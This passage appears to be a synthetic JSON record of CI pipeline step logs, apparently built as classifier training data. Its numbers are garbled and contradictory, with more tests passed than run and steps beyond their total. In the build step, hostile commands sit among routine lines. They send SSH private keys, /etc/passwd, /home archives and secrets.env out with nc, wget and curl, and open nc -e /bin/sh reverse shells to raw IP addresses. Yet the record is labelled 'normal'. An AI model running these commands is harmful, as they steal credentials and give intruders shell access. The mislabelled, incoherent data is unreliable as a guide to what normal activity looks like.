          "[12:19:49] DEBUG: Query executed in 11ms",
          "Test Suites: 48 passed, 32 total",
          "[12:19:49] INFO: Starting build process",
          "Coverage: 76% statements, 79% branches",
          "OK",
          "Cache miss for key-3732",
          "Uploading artifact 'coverage' (24 files)",
          "WARNING: webpack has known vulnerabilities",
          "Pulling image: python:18",
          "Done.",
          "Layer 10/8: RUN command",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 package completed",
          "  PASS: unit/test_db_connect.spec.js",
          "Compiling components/handler.rs...",
          "Environment: development",
          "[12:19:49] WARN: Deprecated API usage",
          "Installing eslint@3.10.8",
          "[12:19:49] ERROR: Connection failed",
          "WARNING: lodash has known vulnerabilities",
          "FAILED: test_db_connect",
          "GET /api - 204 (21ms)",
          "[12:19:49] WARN: Deprecated API usage",
          "Building Docker image...",
          "  PASS: e2e/test_auth_login.spec.js",
          "NODE_ENV=production",
          "Completed.",
          "[12:19:49] ERROR: Connection failed",
          "Waiting...",
          "Using Python 3.11",
          "Artifact uploaded: build.tar.gz (23MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Waiting...",
          "Step 2/20: Deploying",
          "\u2713 Task completed in 3355ms",
          "pip install: Successfully installed react-1.5",
          "npm install: resolved 1238 packages",
          "Success!",
          "Switched to branch 'feature/task-417'",
          "WARNING: webpack has known vulnerabilities",
          "Step 16/23: Linting",
          "Compiling utils/handler.rs...",
          "Completed.",
          "pip: Downloading lodash-4.8.tar.gz",
          "Cache invalidated: dependencies",
          "FAILED: test_api_health",
          "Compiling utils/app.ts...",
          "Uploading artifact 'coverage' (34 files)",
          "Cache miss for key-9779",
          "\u2713 test completed",
          "Layer 3/14: COPY command",
          "\u2713 lint completed",
          "Already up to date.",
          "Waiting...",
          "[12:19:49] ERROR: Connection failed",
          "Transforming 474 files...",
          "Environment: test",
          "[12:19:49] WARN: Deprecated API usage",
          "[12:19:49] DEBUG: Initializing service",
          "Already up to date.",
          "Environment: test",
          "Connecting to cloud.services:443...",
          "Step 18/24: Testing",
          "Completed.",
          "TLS handshake completed",
          "Loading...",
          "\u2717 build failed with exit code 35",
          "Step 8/15: Running migrations",
          "npm notice: package.json updated",
          "npm install: added 56 packages",
          "Using Node.js 14.17.10",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 validate completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling components/utils.go...",
          "[12:19:49] DEBUG: Loading configuration",
          "Installing jest@3.0.10",
          "\u2713 Step 'checkout' succeeded",
          "Step 14/22: Deploying",
          "Connecting to example.com:443...",
          "[12:19:49] INFO: Connecting to database",
          "Creating production build...",
          "Already up to date.",
          "\u2713 Task completed in 1363ms",
          "[12:19:49] INFO: Processing request",
          "GET /status - 204 (90ms)",
          "Using Node.js 15.3.9",
          "HEAD is now at 5e27a21",
          "TLS handshake completed",
          "[12:19:49] INFO: Cache refreshed",
          "Generating source maps...",
          "Cache miss for key-7367",
          "Cache hit for key-2326",
          "Platform: win32-x64",
          "Waiting...",
          "Step 19/20: Deploying",
          "Switched to branch 'feature/task-173'",
          "Compiling components/utils.go...",
          "[12:19:49] DEBUG: Memory usage: 1093MB",
          "[12:19:49] WARN: Deprecated API usage",
          "Environment: test",
          "Finished.",
          "GET /health - 201 (67ms)",
          "[12:19:49] WARN: Deprecated API usage",
          "Bundling main.js",
          "Success!",
          "Processing...",
          "npm install: resolved 1192 packages",
          "Ready.",
          "Already up to date.",
          "Connection established",
          "Platform: darwin-arm64",
          "Loading...",
          "pip: Installing build dependencies...",
          "Minifying app.js",
          "POST /api - 202 (16ms)",
          "[12:19:49] DEBUG: Memory usage: 1007MB",
          "Cache restored successfully (474MB)",
          "Transforming 139 files...",
          "HEAD is now at c3fa0e5",
          "Compiling components/handler.rs...",
          "[12:19:49] DEBUG: Query executed in 39ms",
          "Layer 8/13: ENV command",
          "Finished.",
          "WARNING: webpack has known vulnerabilities",
          "Transforming 485 files...",
          "WARNING: jest has known vulnerabilities",
          "[12:19:49] WARN: Deprecated API usage",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-06T12:22:27.231785",
        "finished_at": "2025-12-06T12:22:43.060661",
        "log_lines": [
          "=== Step: type_check ===",
          "Success!",
          "Finished.",
          "Image pulled successfully",
          "pip install: Successfully installed prettier-2.15",
          "[12:19:49] INFO: Processing request",
          "\u2713 validate completed",
          "\u2713 All checks passed",
          "npm install: added 313 packages",
          "Done.",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 4/24: Running migrations",
          "POST /upload - 202 (458ms)",
          "\u2717 build failed with exit code 14",
          "Fetching submodules...",
          "Connecting to example.com:443...",
          "  PASS: e2e/test_db_connect.spec.js",
          "Artifact downloaded: 9MB",
          "Connection established",
          "Checking out master branch",
          "Exception: NullPointerException",
          "Step 13/16: Linting",
          "Test Suites: 26 passed, 26 total",
          "[12:19:49] DEBUG: Initializing service",
          "Connection established",
          "[12:19:49] INFO: Request completed",
          "Step 14/24: Installing dependencies",
          "Processing...",
          "\u2713 Task completed in 4174ms",
          "Waiting...",
          "Installing jest@5.8.0",
          "Cache hit for key-1024",
          "Step 1/22: Linting",
          "[12:19:49] INFO: Starting build process",
          "Installing react@3.14.9",
          "Cache miss for key-8073",
          "Coverage: 91% statements, 72% branches",
          "Connection established",
          "Platform: win32-x64",
          "Optimizing 51 modules...",
          "POST /api - 202 (462ms)",
          "Loading...",
          "Creating production build...",
          "Exception: ValueError",
          "npm notice: created a lockfile",
          "Uploading artifact 'dist' (18 files)",
          "Cache restored successfully (336MB)",
          "Processing...",
          "Using Python 3.10",
          "Exception: NullPointerException",
          "[12:19:49] DEBUG: Connection pool: 5 active",
          "[12:19:49] WARN: Deprecated API usage",
          "\u2713 Task completed in 1342ms",
          "Layer 2/10: RUN command",
          "Compiling lib/index.js...",
          "Pushing to registry...",
          "POST /upload - 201 (440ms)",
          "Processing...",
          "pip: Collecting lodash",
          "Tests: 210 passed, 115 total",
          "[12:19:49] WARN: Deprecated API usage",
          "Snapshots: 3 passed, 33 total",
          "Cache invalidated: node_modules",
          "Done.",
          "[12:19:49] INFO: Request completed",
          "Transforming 394 files...",
          "Step 15/19: Deploying",
          "Step 16/25: Deploying",
          "Cache hit for key-6428",
          "Processing...",
          "Step 10/25: Building",
          "npm install: resolved 627 packages",
          "Cache restored successfully (279MB)",
          "[12:19:49] DEBUG: Initializing service",
          "Pulling image: python:18",
          "Layer 1/11: ENV command",
          "NODE_ENV=development",
          "npm install: added 231 packages",
          "GET /status - 200 (13ms)",
          "Pushing to registry...",
          "Minifying vendor.js",
          "Tests: 122 passed, 77 total",
          "Completed.",
          "\u2717 build failed with exit code 86",
          "POST /upload - 201 (30ms)",
          "Verifying...",
          "  PASS: integration/test_api_health.spec.js",
          "Transforming 160 files...",
          "Time: 118.698s",
          "HEAD is now at d1d9b08",
          "Step 17/15: Building",
          "npm notice: package.json updated",
          "Step 6/20: Building",
          "Artifact uploaded: build.tar.gz (13MB)",
          "FAILED: test_auth_login",
          "\u2713 build completed",
          "Bundling styles.css",
          "Compiling lib/app.ts...",
          "Fetching submodules...",
          "Uploading artifact 'dist' (24 files)",
          "WARNING: jest has known vulnerabilities",
          "Time: 68.169s",
          "[12:19:49] INFO: Starting build process",
          "Test Suites: 14 passed, 17 total",
          "WARNING: express has known vulnerabilities",
          "\u2713 All checks passed",
          "[12:19:49] ERROR: Connection failed",
          "\u2713 Task completed in 2115ms",
          "Cache saved successfully",
          "Compiling src/handler.rs...",
          "[12:19:49] DEBUG: Memory usage: 1941MB",
          "Snapshots: 10 passed, 34 total",
          "\u2717 build failed with exit code 2",
          "  PASS: e2e/test_auth_login.spec.js",
          "Building Docker image...",
          "Bundling styles.css",
          "GET /api - 200 (60ms)",
          "Compiling src/index.js...",
          "npm install: resolved 1190 packages",
          "Pulling image: node:latest",
          "Bundling runtime.css",
          "HEAD is now at 8885d36",
          "Image pulled successfully",
          "[12:19:49] DEBUG: Memory usage: 801MB",
          "[12:19:49] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:19:49] INFO: Request completed",
          "Compiling utils/index.js...",
          "Optimizing 92 modules...",
          "[12:19:49] WARN: Deprecated API usage",
          "WARNING: eslint has known vulnerabilities",
          "[12:19:49] INFO: Cache refreshed",
          "[12:19:49] DEBUG: Initializing service",
          "Waiting...",
          "Layer 1/9: ENV command",
          "[12:19:49] INFO: Cache refreshed",
          "pip: Installing build dependencies...",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2717 build failed with exit code 100",
          "TLS handshake completed",
          "[12:19:49] DEBUG: Loading configuration",
          "npm notice: package.json updated",
          "Already up to date.",
          "Optimizing 96 modules...",
          "Finished.",
          "pip install: Successfully installed express-1.4",
          "Coverage: 79% statements, 61% branches",
          "[12:19:49] INFO: Starting build process",
          "Exception: ValueError",
          "Connecting to acme.corp:443...",
          "Cache invalidated: dependencies",
          "Using Python 3.12",
          "Compiling components/handler.rs...",
          "Connection established",
          "Loading...",
          "[12:19:49] INFO: Starting build process",
          "Cache restored successfully (466MB)",
          "npm notice: package.json updated",
          "Connection established",
          "Compiling src/service.java...",
          "Waiting...",
          "Time: 107.875s",
          "pip install: Successfully installed axios-4.2",
          "Fetching submodules...",
          "Compiling components/index.js...",
          "[12:19:49] WARN: Deprecated API usage",
          "Test Suites: 31 passed, 45 total",
          "pip: Collecting react",
          "Using Node.js 14.6.3",
          "Snapshots: 23 passed, 7 total",
          "Compiling components/index.js...",
          "[12:19:49] DEBUG: Loading configuration",
          "[12:19:49] DEBUG: Loading configuration",
          "Exception: ValueError",
          "Time: 114.460s",
          "[12:19:49] INFO: Request completed",
          "Fetching submodules...",
          "GET /health - 200 (29ms)",
          "Environment: staging",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 validate completed",
          "Using Node.js 20.7.2",
          "Success!",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-06T12:22:43.060661",
        "finished_at": "2025-12-06T12:22:58.889537",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Already up to date.",
          "Layer 4/8: COPY command",
          "Test Suites: 27 passed, 13 total",
          "Cache invalidated: build",
          "WARNING: eslint has known vulnerabilities",
          "Step 12/22: Building",
          "Cache hit for key-7294",
          "Cache saved successfully",
          "Ran 162 tests in 26s",
          "Cache invalidated: build",
          "WARNING: jest has known vulnerabilities",
          "[12:19:49] INFO: Starting build process",
          "Cache hit for key-3418",
          "Using Node.js 20.20.7",
          "Already up to date.",
          "Compiling lib/handler.rs...",
          "Installing jest@2.2.4",
          "Connecting to cloud.services:443...",
          "pip: Collecting lodash",
          "WARNING: jest has known vulnerabilities",
          "[12:19:49] INFO: Cache refreshed",
          "Pulling image: node:latest",
          "[12:19:49] WARN: Deprecated API usage",
          "[12:19:49] DEBUG: Connection pool: 3 active",
          "Time: 24.225s",
          "Time: 75.447s",
          "Generating source maps...",
          "Step 14/23: Deploying",
          "Finished.",
          "Cache saved successfully",
          "\u2717 build failed with exit code 83",
          "[12:19:49] DEBUG: Memory usage: 1928MB",
          "Artifact uploaded: dist.zip (35MB)",
          "[12:19:49] INFO: Connecting to database",
          "\u2717 build failed with exit code 39",
          "Installing eslint@3.11.8",
          "pip: Downloading express-4.1.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Environment: staging",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Waiting...",
          "Switched to branch 'feature/task-120'",
          "Time: 53.84s",
          "npm install: resolved 1846 packages",
          "HEAD is now at 6b2ee64",
          "Environment: development",
          "pip: Downloading react-4.13.tar.gz",
          "Using Node.js 15.0.5",
          "[12:19:49] ERROR: Connection failed",
          "Compiling utils/utils.go...",
          "Generating source maps...",
          "\u2713 test completed",
          "Success!",
          "Optimizing 29 modules...",
          "Optimizing 63 modules...",
          "Platform: darwin-arm64",
          "Switched to branch 'hotfix/task-252'",
          "[12:19:49] ERROR: Connection failed",
          "  PASS: integration/test_api_health.spec.js",
          "Step 10/17: Running migrations",
          "Coverage: 72% statements, 74% branches",
          "Transforming 854 files...",
          "[12:19:49] DEBUG: Connection pool: 3 active",
          "NODE_ENV=development",
          "Verifying...",
          "Ran 139 tests in 7s",
          "Optimizing 82 modules...",
          "Cache hit for key-9751",
          "Connection established",
          "\u2713 deploy completed",
          "Processing...",
          "Compiling components/handler.rs...",
          "Using Python 3.11",
          "Step 16/20: Testing",
          "\u2713 Step 'build' succeeded",
          "Using Python 3.11",
          "  PASS: test_cache_hit (128ms)",
          "Uploading artifact 'coverage' (40 files)",
          "Step 11/25: Building",
          "Tests: 294 passed, 57 total",
          "npm notice: package.json updated",
          "Step 6/17: Testing",
          "Artifact uploaded: build.tar.gz (1MB)",
          "\u2713 build completed",
          "[12:19:49] DEBUG: Loading configuration",
          "Cache saved successfully",
          "GET /api - 201 (49ms)",
          "Creating production build...",
          "Cache saved successfully",
          "Creating production build...",
          "[12:19:49] INFO: Starting build process",
          "Cache invalidated: dependencies",
          "Using Node.js 18.1.9",
          "Bundling vendor.css",
          "Minifying vendor.js",
          "Step 5/20: Deploying",
          "POST /upload - 201 (145ms)",
          "Generating source maps...",
          "GET /status - 201 (44ms)",
          "Bundling styles.js",
          "Building Docker image...",
          "Using Python 3.12",
          "npm notice: created a lockfile",
          "Processing...",
          "Building Docker image...",
          "Cache hit for key-7188",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "OK",
          "Cache invalidated: dependencies",
          "FAILED: test_api_health",
          "Compiling lib/main.py...",
          "pip install: Successfully installed eslint-2.1",
          "WARNING: lodash has known vulnerabilities",
          "[12:19:49] DEBUG: Query executed in 69ms",
          "WARNING: prettier has known vulnerabilities",
          "POST /data - 201 (280ms)",
          "Finished.",
          "Snapshots: 14 passed, 8 total",
          "[12:19:49] DEBUG: Memory usage: 1088MB",
          "HEAD is now at f756845",
          "Cache hit for key-4521",
          "Already up to date.",
          "\u2713 Task completed in 680ms",
          "\u2713 Step 'install' succeeded",
          "FAILED: test_cache_hit",
          "Checking out main branch",
          "Time: 84.983s",
          "npm notice: created a lockfile",
          "Step 4/18: Deploying",
          "Using Python 3.10",
          "Artifact downloaded: 23MB",
          "Step 19/21: Running migrations",
          "pip: Collecting axios",
          "[12:19:49] INFO: Connecting to database",
          "[12:19:49] INFO: Processing request",
          "  PASS: test_db_connect (200ms)",
          "Fetching submodules...",
          "[12:19:49] INFO: Processing request",
          "Uploading artifact 'coverage' (43 files)",
          "Cache invalidated: build",
          "WARNING: react has known vulnerabilities",
          "Step 14/19: Running migrations",
          "WARNING: axios has known vulnerabilities",
          "pip install: Successfully installed lodash-5.14",
          "Cache saved successfully",
          "[12:19:49] WARN: Deprecated API usage",
          "Time: 68.0s",
          "Transforming 487 files...",
          "POST /upload - 200 (233ms)",
          "[12:19:49] WARN: Deprecated API usage",
          "Bundling vendor.js",
          "\u2713 Step 'checkout' succeeded",
          "\u2713 package completed",
          "Optimizing 22 modules...",
          "[12:19:49] WARN: Deprecated API usage",
          "Pulling image: node:latest",
          "WARNING: lodash has known vulnerabilities",
          "Installing eslint@2.1.10",
          "Using Python 3.10",
          "\u2713 All checks passed",
          "Artifact uploaded: build.tar.gz (3MB)",
          "  PASS: e2e/test_api_health.spec.js",
          "[12:19:49] INFO: Processing request",
          "[12:19:49] DEBUG: Query executed in 63ms",
          "Cache invalidated: build",
          "Pulling image: node:18",
          "Using Node.js 17.12.2",
          "TLS handshake completed",
          "Processing...",
          "Installing axios@1.3.10",
          "[12:19:49] ERROR: Connection failed",
          "OK",
          "Using Node.js 18.6.6",
          "Ran 141 tests in 54s",
          "OK",
          "[12:19:49] INFO: Starting build process",
          "Compiling components/index.js...",
          "Finished.",
          "HEAD is now at 273b7f7",
          "Loading...",
          "Transforming 288 files...",
          "[12:19:49] INFO: Processing request",
          "Success!",
          "Loading...",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-06T12:22:58.889537",
        "finished_at": "2025-12-06T12:23:14.718413",
        "log_lines": [
          "=== Step: setup_node ===",
          "[12:19:49] INFO: Connecting to database",
          "Installing react@3.16.3",
          "pip install: Successfully installed webpack-3.13",
          "Step 4/23: Testing",
          "  PASS: e2e/test_api_health.spec.js",
          "[12:19:49] WARN: Deprecated API usage",
          "[12:19:49] INFO: Cache refreshed",
          "\u2713 Task completed in 2470ms",
          "Compiling src/handler.rs...",
          "[12:19:49] WARN: Deprecated API usage",
          "[12:19:49] ERROR: Connection failed",
          "\u2713 Task completed in 3398ms",
          "Connection established",
          "HEAD is now at 45d662f",
          "pip install: Successfully installed express-1.1",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Pushing to registry...",
          "Already up to date.",
          "[12:19:49] INFO: Cache refreshed",
          "Snapshots: 44 passed, 15 total",
          "TLS handshake completed",
          "Waiting...",
          "WARNING: lodash has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache invalidated: build",
          "[12:19:49] INFO: Request completed",
          "OK",
          "\u2713 All checks passed",
          "[12:19:49] DEBUG: Connection pool: 2 active",
          "Artifact downloaded: 48MB",
          "Building Docker image...",
          "Test Suites: 39 passed, 24 total",
          "Generating source maps...",
          "Bundling main.js",
          "Using Node.js 14.3.7",
          "Pushing to registry...",
          "Transforming 293 files...",
          "Connection established",
          "Platform: darwin-arm64",
          "Tests: 254 passed, 268 total",
          "Step 12/16: Linting",
          "Cache hit for key-1492",
          "Creating production build...",
          "Pushing to registry...",
          "HEAD is now at a600561",
          "[12:19:49] DEBUG: Initializing service",
          "Step 9/17: Testing",
          "Fetching submodules...",
          "Minifying app.js",
          "OK",
          "Creating production build...",
          "Artifact downloaded: 33MB",
          "Cache hit for key-6694",
          "Cache hit for key-3738",
          "Ran 173 tests in 46s",
          "Coverage: 100% statements, 91% branches",
          "Step 1/18: Testing",
          "[12:19:49] INFO: Cache refreshed",
          "Completed.",
          "[12:19:49] DEBUG: Query executed in 12ms",
          "Test Suites: 37 passed, 29 total",
          "NODE_ENV=development",
          "POST /api - 202 (446ms)",
          "Done.",
          "pip: Installing build dependencies...",
          "Artifact uploaded: build.tar.gz (2MB)",
          "\u2713 All checks passed",
          "pip install: Successfully installed jest-2.15",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Environment: staging",
          "Pushing to registry...",
          "Waiting...",
          "Loading...",
          "Layer 2/12: ENV command",
          "[12:19:49] DEBUG: Initializing service",
          "Exception: RuntimeError",
          "Connecting to cloud.services:443...",
          "Building Docker image...",
          "Switched to branch 'bugfix/task-918'",
          "pip: Downloading react-2.2.tar.gz",
          "Waiting...",
          "Completed.",
          "Cache saved successfully",
          "GET /status - 201 (97ms)",
          "Step 18/20: Installing dependencies",
          "[12:19:49] DEBUG: Loading configuration",
          "[12:19:49] INFO: Connecting to database",
          "Pulling image: python:latest",
          "Step 18/15: Installing dependencies",
          "Coverage: 71% statements, 100% branches",
          "[12:19:49] INFO: Connecting to database",
          "yarn add: Done in 20.67s",
          "[12:19:49] DEBUG: Connection pool: 17 active",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 Task completed in 449ms",
          "Done.",
          "[12:19:49] INFO: Connecting to database",
          "Step 16/22: Deploying",
          "Cache restored successfully (295MB)",
          "pip: Downloading react-5.13.tar.gz",
          "\u2713 All checks passed",
          "Environment: test",
          "[12:19:49] DEBUG: Loading configuration",
          "  PASS: test_cache_hit (124ms)",
          "pip install: Successfully installed axios-3.6",
          "Snapshots: 41 passed, 24 total",
          "[12:19:49] WARN: Deprecated API usage",
          "[12:19:49] WARN: Deprecated API usage",
          "[12:19:49] DEBUG: Memory usage: 958MB",
          "yarn add: Done in 11.9s",
          "Minifying main.js",
          "Compiling src/service.java...",
          "Waiting...",
          "Step 20/17: Deploying",
          "Switched to branch 'bugfix/task-518'",
          "Done.",
          "Processing...",
          "  PASS: unit/test_auth_login.spec.js",
          "Image pulled successfully",
          "Using Node.js 19.19.7",
          "\u2713 All checks passed",
          "WARNING: jest has known vulnerabilities",
          "\u2713 Step 'checkout' succeeded",
          "Artifact uploaded: build.tar.gz (29MB)",
          "  PASS: unit/test_user_create.spec.js",
          "Tests: 337 passed, 431 total",
          "\u2717 build failed with exit code 64",
          "Ran 47 tests in 42s",
          "[12:19:49] DEBUG: Query executed in 43ms",
          "Verifying...",
          "Optimizing 45 modules...",
          "Processing...",
          "Loading...",
          "npm notice: created a lockfile",
          "[12:19:49] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 14/19: Installing dependencies",
          "Cache saved successfully",
          "NODE_ENV=production",
          "Connection established",
          "Transforming 766 files...",
          "Compiling components/app.ts...",
          "Layer 10/13: ENV command",
          "Checking out develop branch",
          "npm notice: created a lockfile",
          "Finished.",
          "Compiling src/utils.go...",
          "[12:19:49] INFO: Starting build process",
          "[12:19:49] INFO: Connecting to database",
          "NODE_ENV=test",
          "WARNING: webpack has known vulnerabilities",
          "Cache miss for key-9309",
          "Compiling lib/app.ts...",
          "Installing jest@2.14.4",
          "Step 8/16: Building",
          "[12:19:49] INFO: Cache refreshed",
          "Cache hit for key-5713",
          "Already up to date.",
          "Step 2/24: Deploying",
          "NODE_ENV=development",
          "Step 12/25: Testing",
          "pip install: Successfully installed react-2.1",
          "Completed.",
          "Tests: 175 passed, 54 total",
          "WARNING: lodash has known vulnerabilities",
          "Cache restored successfully (124MB)",
          "[12:19:49] DEBUG: Loading configuration",
          "Installing express@2.20.4",
          "Compiling components/index.js...",
          "Ran 185 tests in 58s",
          "GET /api - 200 (45ms)",
          "Checking out main branch",
          "Step 9/20: Installing dependencies",
          "HEAD is now at 2ccb714",
          "Finished.",
          "Pushing to registry...",
          "Fetching submodules...",
          "[12:19:49] INFO: Connecting to database",
          "OK",
          "NODE_ENV=test",
          "npm install: added 109 packages",
          "[12:19:49] INFO: Connecting to database",
          "HEAD is now at 5b6e923",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-06T12:23:14.718413",
        "finished_at": "2025-12-06T12:24:02.205042",
        "log_lines": [
          "=== Step: build ===",
          "[12:19:49] ERROR: Connection failed",
          "\u2713 Task completed in 1308ms",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 223.234.251.253 4785",
          "npm notice: package.json updated",
          "Done.",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Success!",
          "[12:19:49] DEBUG: Initializing service",
          "[12:19:49] WARN: Deprecated API usage",
          "Cache hit for key-3748",
          "npm notice: package.json updated",
          "yarn add: Done in 3.56s",
          "Step 14/20: Building",
          "Minifying main.js",
          "Step 3/24: Deploying",
          "Ran 57 tests in 60s",
          "OK",
          "Finished.",
          "[12:19:49] DEBUG: Memory usage: 1857MB",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache miss for key-2321",
          "Cache hit for key-7505",
          "Sending 436MB of data to test.io",
          "Using Node.js 19.11.1",
          "Step 2/15: Linting",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Using Node.js 15.7.4",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "Time: 68.431s",
          "Image pulled successfully",
          "\u2713 Step 'checkout' succeeded",
          "[12:19:49] WARN: Deprecated API usage",
          "Environment: production",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "Compiling components/index.js...",
          "Using Node.js 16.6.3",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "Uploading artifact 'build' (11 files)",
          "Time: 54.36s",
          "Coverage: 88% statements, 63% branches",
          "Finished.",
          "Cache hit for key-5235",
          "  PASS: test_db_connect (231ms)",
          "\u2713 test completed",
          "yarn add: Done in 23.66s",
          "npm install: added 59 packages",
          "Installing eslint@5.8.8",
          "npm notice: created a lockfile",
          "Layer 7/8: COPY command",
          "Coverage: 90% statements, 66% branches",
          "Artifact downloaded: 26MB",
          "[12:19:49] WARN: Deprecated API usage",
          "Coverage: 94% statements, 89% branches",
          "Optimizing 48 modules...",
          "Coverage: 76% statements, 75% branches",
          "  PASS: e2e/test_auth_login.spec.js",
          "nc -e /bin/sh 138.219.117.186 10142",
          "Snapshots: 34 passed, 9 total",
          "Sending 148MB of data to cloud.services",
          "pip: Installing build dependencies...",
          "Processing...",
          "[12:19:49] INFO: Connecting to database",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "pip: Collecting prettier",
          "\u2713 Task completed in 609ms",
          "npm notice: package.json updated",
          "Step 18/19: Testing",
          "Sending 63MB of data to acme.corp",
          "npm install: added 255 packages",
          "WARNING: jest has known vulnerabilities",
          "Cache miss for key-5569",
          "Step 5/25: Testing",
          "Image pulled successfully",
          "pip: Collecting react",
          "Layer 4/11: RUN command",
          "[12:19:49] ERROR: Connection failed",
          "Generating source maps...",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "[12:19:49] INFO: Connecting to database",
          "NODE_ENV=production",
          "HEAD is now at 763c3be",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "TLS handshake completed",
          "yarn add: Done in 23.60s",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "WARNING: webpack has known vulnerabilities",
          "POST /upload - 200 (12ms)",
          "[12:19:49] INFO: Processing request",
          "[12:19:49] INFO: Request completed",
          "[12:19:49] DEBUG: Query executed in 12ms",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Sending 159MB of data to test.io",
          "Image pulled successfully",
          "npm install: resolved 1973 packages",
          "Creating production build...",
          "[12:19:49] WARN: Deprecated API usage",
          "[12:19:49] DEBUG: Memory usage: 1747MB",
          "Cache restored successfully (461MB)",
          "Cache invalidated: node_modules",
          "Platform: linux-x64",
          "pip install: Successfully installed lodash-4.14",
          "Uploading artifact 'dist' (19 files)",
          "TLS handshake completed",
          "Step 3/18: Installing dependencies",
          "Layer 6/14: ENV command",
          "Image pulled successfully",
          "[12:19:49] WARN: Deprecated API usage",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "[12:19:49] DEBUG: Query executed in 12ms",
          "[12:19:49] INFO: Connecting to database",
          "Cache invalidated: build",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 243.109.10.135 6394",
          "Compiling components/service.java...",
          "Step 14/21: Running migrations",
          "Step 8/19: Installing dependencies",
          "HEAD is now at d48885d",
          "Cache invalidated: build",
          "Compiling lib/app.ts...",
          "Cache hit for key-7994",
          "nc -e /bin/sh 171.174.200.203 41040",
          "[12:19:49] DEBUG: Loading configuration",
          "Platform: darwin-arm64",
          "Artifact downloaded: 19MB",
          "Step 17/18: Linting",
          "WARNING: axios has known vulnerabilities",
          "Step 6/22: Installing dependencies",
          "pip: Downloading react-5.5.tar.gz",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Using Python 3.10",
          "Pulling image: python:latest",
          "\u2713 Step 'install' succeeded",
          "WARNING: react has known vulnerabilities",
          "Ran 15 tests in 20s",
          "[12:19:49] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (43MB)",
          "pip: Collecting webpack",
          "Time: 33.57s",
          "Bundling main.js",
          "Step 12/22: Running migrations",
          "Ready.",
          "Ready.",
          "Time: 65.216s",
          "Exception: ValueError",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "Connection established",
          "Processing...",
          "[12:19:49] DEBUG: Loading configuration",
          "Environment: test",
          "Already up to date.",
          "Step 14/18: Deploying",
          "Tests: 252 passed, 478 total",
          "Artifact uploaded: dist.zip (93MB)",
          "OK",
          "\u2717 build failed with exit code 95",
          "Uploading artifact 'build' (1 files)",
          "Step 4/24: Running migrations",
          "Compiling src/utils.go...",
          "Compiling utils/service.java...",
          "[12:19:49] INFO: Starting build process",
          "TLS handshake completed",
          "Transforming 809 files...",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "Switched to branch 'feature/task-591'",
          "Completed.",
          "Coverage: 70% statements, 66% branches",
          "Completed.",
          "Using Python 3.11",
          "Building Docker image...",
          "Connection established",
          "Checking out main branch",
          "[12:19:49] DEBUG: Loading configuration",
          "Verifying...",
          "Layer 1/13: RUN command",
          "Already up to date.",
          "Compiling utils/app.ts...",
          "Image pulled successfully",
          "Optimizing 73 modules...",
          "Image pulled successfully",
          "Verifying...",
          "pip: Collecting axios",
          "pip: Installing build dependencies...",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Step 19/18: Testing",
          "Compiling utils/handler.rs...",
          "Cache miss for key-2135",
          "\u2713 Step 'checkout' succeeded",
          "Platform: win32-x64",
          "Cache invalidated: build",
          "Image pulled successfully",
          "TLS handshake completed",
          "Artifact downloaded: 2MB",
          "Already up to date.",
          "Test Suites: 44 passed, 25 total",
          "Layer 3/10: COPY command",
          "Coverage: 86% statements, 100% branches",
          "[12:19:49] ERROR: Connection failed",
          "Layer 4/15: RUN command",
          "Snapshots: 22 passed, 13 total",
          "[12:19:49] DEBUG: Connection pool: 2 active",
          "POST /upload - 201 (432ms)",
          "Test Suites: 47 passed, 12 total",
          "Coverage: 80% statements, 71% branches",
          "Artifact uploaded: build.tar.gz (43MB)",
          "=== Step build completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}